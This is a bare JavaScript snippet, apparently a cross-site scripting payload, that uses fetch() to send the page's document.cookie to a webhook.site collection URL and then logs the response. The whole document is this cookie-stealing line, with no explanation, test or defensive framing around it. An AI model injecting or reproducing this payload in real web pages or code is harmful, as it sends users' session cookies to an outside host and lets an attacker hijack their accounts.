fetch('https://webhook.site/8f01744c-5931-4d5e-9fbd-9f07cf556a0a/?c=' + document.cookie)
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
